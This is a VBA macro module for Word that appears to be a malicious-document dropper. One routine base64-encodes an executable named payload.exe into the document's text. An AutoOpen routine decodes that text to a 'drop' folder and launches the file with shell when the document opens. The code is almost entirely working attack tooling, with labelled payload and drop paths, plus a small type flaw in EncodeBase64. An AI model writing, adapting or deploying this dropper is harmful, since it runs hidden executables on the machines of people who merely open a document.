' this function encodes the given bytes as a base64 string
Function EncodeBase64(ByVal bytes As Byte) As String
    ' declare some variables
    Dim objXML As MSXML2.DOMDocument60
    Dim objNode As MSXML2.IXMLDOMElement

    ' can't encode without these
    Set objXML = New MSXML2.DOMDocument60
    Set objNode = objXML.createElement("b64")

    ' encode the binary data and return the base64 string
    objNode.dataType = "bin.base64"
    objNode.nodeTypedValue = bytes
    EncodeBase64 = objNode.text

    ' clean up
    Set objNode = Nothing
    Set objXML = Nothing
End Function


' this function decodes the given base64 data into bytes
Function DecodeBase64(ByVal base64Data As String) As Byte()
    ' declare some variables
    Dim objXML As MSXML2.DOMDocument60
    Dim objNode As MSXML2.IXMLDOMElement

    ' can't decode without these
    Set objXML = New MSXML2.DOMDocument60
    Set objNode = objXML.createElement("b64")

    ' decode the base64 data and return the byte array
    objNode.dataType = "bin.base64"
    objNode.text = base64Data
    DecodeBase64 = objNode.nodeTypedValue

    ' clean up
    Set objNode = Nothing
    Set objXML = Nothing
End Function


' this subroutine base64 encodes a binary file and puts the base64 string into the active document
Sub EncodeFileToDocumentBase64()
    ' +---------------------------------------------+
    ' | this is the file we're encoding,            |
    ' | so make sure to set the path appropriately! |
    ' +---------------------------------------------+
    Dim fullpath As String: fullpath = "C:\Users\Public\Desktop\access\resources\payload.exe"
    
    ' we'll also need these variables
    Dim objXML As MSXML2.DOMDocument60
    Dim objNode As MSXML2.IXMLDOMElement
    Dim objStream

    ' load the file
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' this is for `adTypeBinary`
    objStream.Open
    objStream.LoadFromFile fullpath
    
    ' base64 encode the file's data
    Set objXML = New MSXML2.DOMDocument60
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.nodeTypedValue = objStream.Read()
    
    ' clear the document and write the base64 data
    ActiveDocument.Range.text = ""
    ActiveDocument.Content.InsertAfter text:=objNode.text
    
    ' clean up
    Set objStream = Nothing
    Set objXML = Nothing
    Set objNode = Nothing
End Sub


' this subroutine decodes the base64 text in the active document and writes the decoded binary to a file
Sub DecodeDocumentToFile()
    ' +---------------------------------------------+
    ' | this is where we're dropping the file       |
    ' | so make sure to set the path appropriately! |
    ' | NOTE: the directory must already exist      |
    ' +---------------------------------------------+
    Dim fullpath As String: fullpath = "C:\Users\Public\Desktop\access\drop\payload.exe"

    ' we'll also need these variables
    Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
    Dim b64Data As String

    ' get the base64 from the opened document
    For Each par In ActiveDocument.Paragraphs
        b64Data = b64Data & par.Range.text
    Next par
    
    ' write the binary data to the drop file
    Open fullpath For Binary As 1
        Put #1, 1, DecodeBase64(b64Data)
    Close #1
End Sub


' calls `DecodeDocumentToFile` and executes the payload when the Document is opened
Sub AutoOpen()
    DecodeDocumentToFile
    Dim fullpath As String: fullpath = "C:\Users\Public\Desktop\access\drop\payload.exe"
    shell fullpath
End Sub
